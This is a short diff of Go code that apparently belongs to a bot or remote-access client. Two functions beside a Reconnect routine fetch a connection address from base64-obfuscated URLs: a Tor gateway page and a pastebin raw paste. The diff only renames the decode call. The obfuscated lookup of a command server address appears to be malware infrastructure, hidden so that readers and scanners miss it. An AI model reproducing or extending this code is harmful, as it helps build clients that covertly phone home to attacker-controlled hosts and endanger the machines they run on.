@@ -46,14 +46,14 @@ func Reconnect() {
 
 func getIPTor() string {
 	// use tikedzh6cg5unkrf.onion/ip.html
-	resp, _ := http.Get(base64.Base64Decode("aHR0cDovL3Rpa2Vkemg2Y2c1dW5rcmYub25pb24udG8vaXAuaHRtbA=="))
+	resp, _ := http.Get(base64.Decode("aHR0cDovL3Rpa2Vkemg2Y2c1dW5rcmYub25pb24udG8vaXAuaHRtbA=="))
 	defer resp.Body.Close()
 	respBody, _ := ioutil.ReadAll(resp.Body)
 	return strings.TrimLeft(strings.TrimSpace(string(respBody)), "tcp://")
 }
 
 func getIP() string {
-	resp, _ := http.Get(base64.Base64Decode("aHR0cDovL3Bhc3RlYmluLmNvbS9yYXcvQnVHOTdCU2s="))
+	resp, _ := http.Get(base64.Decode("aHR0cDovL3Bhc3RlYmluLmNvbS9yYXcvQnVHOTdCU2s="))
 	defer resp.Body.Close()
 	respBody, _ := ioutil.ReadAll(resp.Body)
 
